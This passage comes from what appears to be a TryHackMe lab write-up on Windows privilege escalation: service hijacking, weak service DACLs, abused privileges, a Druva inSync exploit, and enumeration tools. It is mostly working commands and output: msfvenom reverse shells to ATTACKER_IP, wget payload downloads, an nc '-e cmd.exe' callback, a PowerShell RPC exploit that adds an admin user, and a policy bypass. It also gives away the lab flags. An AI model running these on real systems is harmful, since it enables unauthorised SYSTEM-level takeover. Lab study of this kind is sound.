The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ python3 -m http.server
```
Powershell:
```
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
```
Attacker Machine
`nc -lvnp 4446`

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```
Once the service gets restarted, your payload should execute:
```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```
As a result, you'll get a reverse shell with svcusr2 privileges:
```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
type C:\Users\svcusr2\Desktop\flag.txt
```
## Insecure Service Permissions
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:
```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```
We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
```
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
```
C:\> sc stop THMService
C:\> sc start THMService
```
And we will receive a shell back in our attacker's machine with SYSTEM privileges:
```
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```
## Answer the questions below
1: Get the flag on svcusr1's desktop. `THM{AT_YOUR_SERVICE}`

2: Get the flag on svcusr2's desktop. `THM{QUOTES_EVERYWHERE}`

3: Get the flag on the Administrator's desktop. `THM{INSECURE_TRY_TO_DO}`

# Task 6 Abusing dangerous privileges `THM{SEFLAGPRIVILEGE}`
SeBackup / SeRestore
SeTakeOwnership
SeImpersonate / SeAssignPrimaryToken
Attacker Machine\Your Machine
```
nc -lvnp 4442
ip given by tryhackme
site: http://ip given by tryhackme go to the site and run this command
c:\tools\RogueWinRM\RogueWinRM.exe -p “C:\tools\nc64.exe” -a “-e cmd.exe ATTACKER_IP 4442”
```

# Task 7 Abusing vulnerable software `THM{EZ_DLL_PROXY_4ME}`

## Powershell:
```
ErrorActionPreference = “Stop”
$cmd = “net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add”
$s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp ) $s.Connect(“127.0.0.1”, 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes(“inSync PHC RPCW[v0002]”) $rpcType = [System.Text.Encoding]::UTF8.GetBytes(“$([char]0x0005)`0`0`0”) $command = [System.Text.Encoding]::Unicode.GetBytes(“C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd”); $length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header) $s.Send($rpcType) $s.Send($length) $s.Send($command)
```
## Command Prompt:
```
net user pwnd
Note:remmina change user
type C:\Users\Administrator\Desktop\flag.txt
```

# Task 8 Tools of the Trade
Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.

## WinPEAS
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
```
C:\> winpeas.exe > outputfile.txt
```
WinPEAS can be downloaded here.

## PrivescCheck
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
PrivescCheck can be downloaded here.
Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.
```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```
## WES-NG: Windows Exploit Suggester - Next Generation
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
WES-NG is a Python script that can be found and downloaded here.
Once installed, and before using it, type the `wes.py` --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.
To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
Once this is done, wes.py can be run as follows;
```
user@kali$ wes.py systeminfo.txt
```

## Metasploit
If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
# Answer the questions below
Click and continue learning! `No answer needed`

# Task 9 Conclusion
In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:
* PayloadsAllTheThings - Windows Privilege Escalation
* Priv2Admin - Abusing Windows Privileges
* RogueWinRM Exploit
* Potatoes
* Decoder's Blog
* Token Kidnapping
* Hacktricks - Windows Local Privilege Escalation
# Answer the questions below
Click and continue learning! `No answer needed`
